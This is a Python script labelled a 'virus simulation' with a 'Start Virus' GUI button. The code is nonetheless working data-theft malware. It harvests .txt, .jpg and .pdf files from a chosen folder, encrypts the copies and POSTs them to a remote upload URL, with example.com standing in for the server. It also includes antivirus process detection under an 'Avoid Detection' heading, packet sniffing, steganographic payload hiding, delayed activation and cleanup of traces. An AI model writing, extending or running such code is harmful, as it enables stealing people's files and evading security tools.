
# Full Enhanced Code for Virus Simulation

import os
import shutil
import requests
from cryptography.fernet import Fernet
from stegano import lsb
import time
import socket
import psutil
from scapy.all import sniff
import platform
import tkinter as tk

# 1. Create Folder for Collected Data
def create_folder():
    folder_name = "collected_data"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    return folder_name

# 2. Encrypt Files
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# 3. Collect Files
def collect_files(target_folder, extensions, output_folder, key):
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            if file.endswith(tuple(extensions)):
                source = os.path.join(root, file)
                destination = os.path.join(output_folder, file)
                shutil.copy2(source, destination)
                encrypt_file(destination, key)
                print(f"Collected and encrypted: {source}")

# 4. Send Files to Server
def send_files(output_folder, server_url):
    for root, dirs, files in os.walk(output_folder):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(server_url, files={'file': f})
                    if response.status_code == 200:
                        print(f"Successfully sent: {file}")
                    else:
                        print(f"Failed to send: {file}")
            except Exception as e:
                print(f"Error sending {file}: {e}")

# 5. Steganography
def hide_payload_in_image(image_path, payload):
    secret = lsb.hide(image_path, payload)
    secret.save("stego_image.png")

def extract_payload_from_image(stego_image_path):
    return lsb.reveal(stego_image_path)

# 6. Activation Mechanism
def check_server_connection(server, port):
    try:
        socket.create_connection((server, port), timeout=5)
        return True
    except Exception:
        return False

def delayed_activation(delay_seconds):
    time.sleep(delay_seconds)

# 7. Avoid Detection
def check_antivirus():
    antivirus_names = ["Windows Defender", "Norton", "McAfee"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in antivirus_names:
            print(f"Antivirus detected: {proc.info['name']}")
            return True
    return False

# 8. Sniff Network Traffic
def packet_sniffer(interface):
    sniff(iface=interface, prn=lambda x: x.show(), count=10)

# 9. Check Platform
def check_platform():
    system = platform.system()
    print(f"Running on: {system}")
    return system

# 10. Clean Up
def clean_up(output_folder):
    for root, dirs, files in os.walk(output_folder):
        for file in files:
            os.remove(os.path.join(root, file))
    os.rmdir(output_folder)

# 11. GUI
def create_gui():
    root = tk.Tk()
    root.title("Virus Simulation Tool")
    tk.Label(root, text="Welcome to the Simulation!").pack()
    tk.Button(root, text="Start Virus", command=lambda: main()).pack()
    root.mainloop()

# Main Execution
def main():
    # Setup
    target_folder = input("Enter the folder to collect files from: ")
    extensions = ['.txt', '.jpg', '.pdf']  # File types to collect
    server_url = "http://example.com/upload"  # Mock server URL
    output_folder = create_folder()
    
    # Generate Encryption Key
    key = generate_key()

    # Activation
    if not check_server_connection("example.com", 80):
        print("Server not reachable. Exiting.")
        return

    # Collect and Encrypt Files
    collect_files(target_folder, extensions, output_folder, key)

    # Send Files to Server
    send_files(output_folder, server_url)

    # Clean Up
    clean_up(output_folder)
    print("Simulation Complete.")

if __name__ == "__main__":
    create_gui()
